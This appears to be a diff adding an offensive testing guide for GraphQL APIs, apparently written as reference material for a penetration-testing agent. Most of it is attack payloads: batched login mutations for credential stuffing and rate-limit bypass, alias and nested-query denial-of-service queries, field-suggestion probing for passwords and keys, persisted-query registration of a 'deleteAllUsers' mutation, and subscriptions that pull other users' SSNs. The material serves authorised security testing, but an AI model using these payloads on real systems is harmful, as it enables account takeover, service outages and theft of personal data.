@@ -1,0 +1,586 @@
+<graphql_advanced_guide>
+<title>ADVANCED GRAPHQL SECURITY TESTING</title>
+
+<critical>Beyond basic introspection, GraphQL APIs expose unique attack surfaces including batching attacks, alias-based DoS, nested query depth attacks, field suggestion exploitation, persisted query abuse, and subscription hijacking. These advanced techniques can bypass rate limits, cause denial of service, and leak sensitive data.</critical>
+
+<scope>
+- Batching attacks for rate limit bypass
+- Alias-based denial of service
+- Nested query depth attacks
+- Field suggestion exploitation
+- Persisted query abuse
+- Subscription hijacking
+- Directive injection
+- Type confusion attacks
+</scope>
+
+<methodology>
+1. Enumerate schema via introspection or field suggestions.
+2. Test query complexity limits with nested queries.
+3. Probe batching endpoints for rate limit bypass.
+4. Analyze alias handling for DoS potential.
+5. Test subscription security and authorization.
+6. Explore persisted query mechanisms for abuse.
+</methodology>
+
+<batching_attacks>
+<array_batching>
+{% raw %}
+# Query batching for rate limit bypass:
+
+# Standard array batching:
+POST /graphql
+Content-Type: application/json
+
+[
+  {"query": "mutation { login(email:\"a@b.com\", pass:\"pass1\") { token } }"},
+  {"query": "mutation { login(email:\"a@b.com\", pass:\"pass2\") { token } }"},
+  {"query": "mutation { login(email:\"a@b.com\", pass:\"pass3\") { token } }"},
+  {"query": "mutation { login(email:\"a@b.com\", pass:\"pass4\") { token } }"},
+  {"query": "mutation { login(email:\"a@b.com\", pass:\"pass5\") { token } }"}
+]
+
+# Credential stuffing via batch:
+[
+  {"query": "mutation { login(email:\"user1@x.com\", pass:\"123456\") { success } }"},
+  {"query": "mutation { login(email:\"user2@x.com\", pass:\"password\") { success } }"},
+  {"query": "mutation { login(email:\"user3@x.com\", pass:\"qwerty\") { success } }"}
+]
+
+# Account enumeration via batch:
+[
+  {"query": "query { userExists(email:\"user1@x.com\") }"},
+  {"query": "query { userExists(email:\"user2@x.com\") }"},
+  {"query": "query { userExists(email:\"user3@x.com\") }"}
+]
+{% endraw %}
+</array_batching>
+
+<operation_batching>
+{% raw %}
+# Multiple operations in single query:
+
+# Named operation batching:
+query GetUsers {
+  user1: user(id: 1) { name email }
+  user2: user(id: 2) { name email }
+  user3: user(id: 3) { name email }
+  user4: user(id: 4) { name email }
+}
+
+# Mixed query and mutation:
+# Some implementations allow:
+{
+  users { name }
+  createUser(input: {...}) { id }
+}
+
+# Fragment-based batching:
+fragment UserData on User { name email role }
+query {
+  u1: user(id: 1) { ...UserData }
+  u2: user(id: 2) { ...UserData }
+  u3: user(id: 3) { ...UserData }
+}
+{% endraw %}
+</operation_batching>
+</batching_attacks>
+
+<alias_dos>
+<alias_multiplication>
+{% raw %}
+# Alias-based resource exhaustion:
+
+# Simple alias multiplication:
+query {
+  a1: expensiveQuery { data }
+  a2: expensiveQuery { data }
+  a3: expensiveQuery { data }
+  # ... repeat 100+ times
+  a100: expensiveQuery { data }
+}
+
+# Aliased field access:
+query {
+  user(id: 1) {
+    n1: name
+    n2: name
+    n3: name
+    n4: name
+    # ... many duplicates
+  }
+}
+
+# Aliased with different arguments:
+query {
+  u1: user(id: 1) { name }
+  u2: user(id: 2) { name }
+  u3: user(id: 3) { name }
+  # ... enumerate all users
+}
+
+# Expensive resolver multiplication:
+query {
+  s1: search(query: "a") { results { title } }
+  s2: search(query: "b") { results { title } }
+  s3: search(query: "c") { results { title } }
+}
+{% endraw %}
+</alias_multiplication>
+
+<alias_bypass>
+{% raw %}
+# Using aliases to bypass field-level restrictions:
+
+# If a field is limited to once per query:
+query {
+  secretField1: sensitiveData { value }
+  secretField2: sensitiveData { value }
+}
+
+# Bypassing field-level rate limits:
+query {
+  r1: resetPassword(email: "a@b.com") { success }
+  r2: resetPassword(email: "c@d.com") { success }
+}
+
+# Alias naming to evade detection:
+query {
+  __secret: adminData { credentials }
+  _hidden: adminData { apiKeys }
+}
+{% endraw %}
+</alias_bypass>
+</alias_dos>
+
+<nested_query_depth>
+<depth_attacks>
+{% raw %}
+# Nested query depth exploitation:
+
+# Circular reference exploitation:
+query {
+  user(id: 1) {
+    friends {
+      friends {
+        friends {
+          friends {
+            friends {
+              name
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+# Self-referential types:
+query {
+  node(id: "xyz") {
+    ... on Category {
+      parent {
+        parent {
+          parent {
+            name
+          }
+        }
+      }
+    }
+  }
+}
+
+# Deep object graphs:
+query {
+  organization {
+    departments {
+      teams {
+        members {
+          projects {
+            tasks {
+              subtasks {
+                assignee { name }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+{% endraw %}
+</depth_attacks>
+
+<complexity_exploitation>
+{% raw %}
+# Query complexity attacks:
+
+# List field multiplication:
+query {
+  users(first: 1000) {
+    posts(first: 1000) {
+      comments(first: 1000) {
+        replies(first: 1000) {
+          author { name }
+        }
+      }
+    }
+  }
+}
+# Theoretical: 1000 * 1000 * 1000 * 1000 = 10^12 objects
+
+# Width + Depth combination:
+query {
+  a: deepField { b: deepField { name } }
+  c: deepField { d: deepField { name } }
+  e: deepField { f: deepField { name } }
+}
+
+# Connection-based amplification:
+query {
+  users(first: 100) {
+    edges {
+      node {
+        followers(first: 100) {
+          edges {
+            node { name }
+          }
+        }
+      }
+    }
+  }
+}
+{% endraw %}
+</complexity_exploitation>
+</nested_query_depth>
+
+<field_suggestion>
+<suggestion_exploitation>
+{% raw %}
+# Field suggestion for schema discovery:
+
+# Typo-based field discovery:
+query { usrs { name } }
+# Response: "Did you mean 'users'?"
+
+# Similar field names:
+query { user { pasword } }
+# Response: "Did you mean 'password'?"
+
+# Systematic probing:
+query { user { admin_token } }
+query { user { api_key } }
+query { user { secret } }
+query { user { credential } }
+query { user { privateData } }
+query { user { internalId } }
+
+# Type discovery:
+query { __type(name: "Secre") { name } }
+# May suggest: "SecretData", "SecretConfig"
+
+# Directive discovery:
+query { user @depr { name } }
+# May suggest: "@deprecated"
+{% endraw %}
+</suggestion_exploitation>
+
+<introspection_alternatives>
+{% raw %}
+# Schema discovery without introspection:
+
+# Partial introspection (if __schema blocked):
+query { __type(name: "Query") { fields { name type { name } } } }
+query { __type(name: "User") { fields { name } } }
+
+# Error message mining:
+# Send invalid queries and analyze error details
+query { user { nonExistentField } }
+
+# Documentation endpoints:
+GET /graphql/schema
+GET /graphql/docs
+GET /graphql.schema.json
+GET /api/graphql/schema.graphql
+
+# GraphQL Playground/GraphiQL info:
+# May expose schema documentation
+{% endraw %}
+</introspection_alternatives>
+</field_suggestion>
+
+<persisted_queries>
+<persisted_query_abuse>
+{% raw %}
+# Persisted query exploitation:
+
+# Automatic Persisted Queries (APQ):
+POST /graphql
+{
+  "extensions": {
+    "persistedQuery": {
+      "version": 1,
+      "sha256Hash": "abc123..."
+    }
+  }
+}
+
+# Hash collision/brute force:
+# Try common query hashes
+# Dictionary of known query hashes
+
+# Registration abuse:
+# If registration is open:
+POST /graphql
+{
+  "query": "mutation { deleteAllUsers { count } }",
+  "extensions": {
+    "persistedQuery": {
+      "version": 1,
+      "sha256Hash": "attacker_controlled_hash"
+    }
+  }
+}
+
+# Cache poisoning:
+# Register malicious query with legitimate hash
+{% endraw %}
+</persisted_query_abuse>
+
+<query_whitelisting_bypass>
+{% raw %}
+# Bypassing persisted query restrictions:
+
+# Without persisted query (if not enforced):
+POST /graphql
+{"query": "{ users { password } }"}
+
+# Null/empty extensions:
+POST /graphql
+{
+  "query": "{ maliciousQuery }",
+  "extensions": {}
+}
+
+# Invalid version:
+{
+  "extensions": {
+    "persistedQuery": {
+      "version": 999,
+      "sha256Hash": "..."
+    }
+  }
+}
+
+# Mixed mode exploitation:
+# Some endpoints may not require persisted queries
+GET /graphql?query={users{name}}
+{% endraw %}
+</query_whitelisting_bypass>
+</persisted_queries>
+
+<subscription_hijacking>
+<subscription_attacks>
+{% raw %}
+# GraphQL subscription exploitation:
+
+# WebSocket connection:
+ws://target.com/graphql/subscriptions
+wss://target.com/graphql
+
+# Connection init payload:
+{"type": "connection_init", "payload": {"Authorization": "Bearer token"}}
+
+# Subscribe to unauthorized data:
+{
+  "type": "start",
+  "id": "1",
+  "payload": {
+    "query": "subscription { adminNotifications { message secrets } }"
+  }
+}
+
+# Subscribe to other users' data:
+subscription {
+  userUpdates(userId: "victim_id") {
+    email
+    phone
+    ssn
+  }
+}
+
+# Mass subscription DoS:
+# Open many subscriptions simultaneously
+for i in range(1000):
+  subscribe("subscription { updates { data } }")
+{% endraw %}
+</subscription_attacks>
+
+<subscription_auth_bypass>
+{% raw %}
+# Subscription authorization bypass:
+
+# Missing auth on subscription:
+# Query requires auth, subscription doesn't
+subscription { sensitiveUpdates { data } }
+
+# Token reuse:
+# Use expired/revoked token for subscription
+# Connection may persist after token revocation
+
+# Cross-tenant subscriptions:
+subscription {
+  organizationUpdates(orgId: "other_org") {
+    internalData
+  }
+}
+
+# Subscription enumeration:
+subscription { user(id: 1) { ... } }
+subscription { user(id: 2) { ... } }
+# Different users, same connection
+{% endraw %}
+</subscription_auth_bypass>
+</subscription_hijacking>
+
+<directive_injection>
+<directive_attacks>
+{% raw %}
+# Directive-based attacks:
+
+# Skip/Include manipulation:
+query {
+  user {
+    publicData
+    secretData @include(if: true)
+  }
+}
+
+# Deprecated field access:
+query {
+  user {
+    oldPassword @deprecated
+  }
+}
+
+# Custom directive abuse:
+query {
+  user @auth(role: "admin") {
+    adminPanel
+  }
+}
+
+# Directive injection:
+query {
+  user @malicious(payload: "<script>") {
+    name
+  }
+}
+
+# Streaming/defer abuse:
+query {
+  slowQuery @stream {
+    hugeDataset
+  }
+}
+{% endraw %}
+</directive_attacks>
+</directive_injection>
+
+<type_confusion>
+<type_attacks>
+{% raw %}
+# Type confusion and union attacks:
+
+# Interface exploitation:
+query {
+  node(id: "user_1") {
+    ... on AdminUser {
+      adminPrivileges
+      masterKey
+    }
+  }
+}
+
+# Union type abuse:
+query {
+  search(query: "test") {
+    ... on User { ssn }
+    ... on Document { content }
+    ... on Secret { value }
+  }
+}
+
+# Polymorphic query confusion:
+query {
+  entities {
+    __typename
+    ... on PublicEntity { data }
+    ... on PrivateEntity { secrets }
+  }
+}
+{% endraw %}
+</type_attacks>
+</type_confusion>
+
+<common_payloads>
+{% raw %}
+# Batching:
+[{"query":"mutation{login(u:\"a\",p:\"1\"){t}}"},
+ {"query":"mutation{login(u:\"a\",p:\"2\"){t}}"}]
+
+# Alias DoS:
+query{a1:exp{d} a2:exp{d} a3:exp{d} a4:exp{d} a5:exp{d}}
+
+# Deep nesting:
+{u{f{f{f{f{f{f{f{f{f{n}}}}}}}}}}}
+
+# Field suggestion:
+query{user{passwrd}} # typo for suggestion
+
+# Subscription hijack:
+subscription{userUpdates(userId:"victim"){data}}
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate batching bypass of rate limits with multiple operations.
+2. Show alias-based DoS causing measurable server impact.
+3. Prove depth attack bypassing complexity limits.
+4. Document field suggestion leaking schema information.
+5. Provide subscription hijacking accessing unauthorized data.
+</validation>
+
+<false_positives>
+- Query complexity analysis rejecting deep/wide queries
+- Proper batching limits enforced
+- Alias counting in rate limiting
+- Disabled field suggestions
+- Subscription authorization matching query authorization
+- Persisted query enforcement without bypass
+</false_positives>
+
+<impact>
+- Rate limit bypass enabling brute force attacks
+- Denial of service through resource exhaustion
+- Schema discovery when introspection disabled
+- Unauthorized data access via subscriptions
+- Cache poisoning through persisted queries
+- Privilege escalation via type confusion
+</impact>
+
+<pro_tips>
+1. Test batching even when array format is rejected.
+2. Combine aliases with nesting for amplified impact.
+3. Use field suggestions systematically for schema discovery.
+4. Test subscriptions with different authentication states.
+5. Check if persisted query registration is open.
+6. Analyze error messages for schema information leakage.
+7. Test directive injection on all fields.
+8. Check union/interface types for hidden fields.
+9. Monitor server response times for DoS impact.
+10. Document query cost and complexity for report.
+</pro_tips>
+
+<remember>GraphQL's flexibility is also its weakness. The same features that enable efficient data fetching can be abused for attacks. Always test query complexity, batching, subscriptions, and schema exposure beyond basic introspection.</remember>
+</graphql_advanced_guide>
